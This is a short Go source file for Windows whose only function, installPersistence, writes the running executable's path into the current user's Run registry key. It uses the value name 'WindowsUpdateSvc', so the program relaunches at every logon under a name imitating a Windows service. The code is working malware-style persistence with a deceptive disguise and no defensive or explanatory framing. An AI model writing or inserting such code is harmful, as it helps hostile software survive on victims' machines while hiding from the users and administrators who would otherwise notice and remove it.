//go:build windows

package main

import (
	"os"
	"syscall"
	"unsafe"
)

var (
	modAdvapi32 = syscall.NewLazyDLL("advapi32.dll")

	procRegOpenKeyExW  = modAdvapi32.NewProc("RegOpenKeyExW")
	procRegSetValueExW = modAdvapi32.NewProc("RegSetValueExW")
	procRegCloseKey    = modAdvapi32.NewProc("RegCloseKey")
)

const (
	hkeyCurrentUser = 0x80000001
	keySetValue     = 0x0002
	regSZ           = 1
	persistName     = "WindowsUpdateSvc"
)

func installPersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	subKey, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	var hKey syscall.Handle

	ret, _, _ := procRegOpenKeyExW.Call(
		uintptr(hkeyCurrentUser),
		uintptr(unsafe.Pointer(subKey)),
		0,
		uintptr(keySetValue),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret != 0 {
		return
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	valueName, _ := syscall.UTF16PtrFromString(persistName)
	valueData, _ := syscall.UTF16FromString(exePath)
	dataBytes := (*[1 << 20]byte)(unsafe.Pointer(&valueData[0]))[: len(valueData)*2 : len(valueData)*2]

	procRegSetValueExW.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valueName)),
		0,
		uintptr(regSZ),
		uintptr(unsafe.Pointer(&dataBytes[0])),
		uintptr(len(dataBytes)),
	)
}
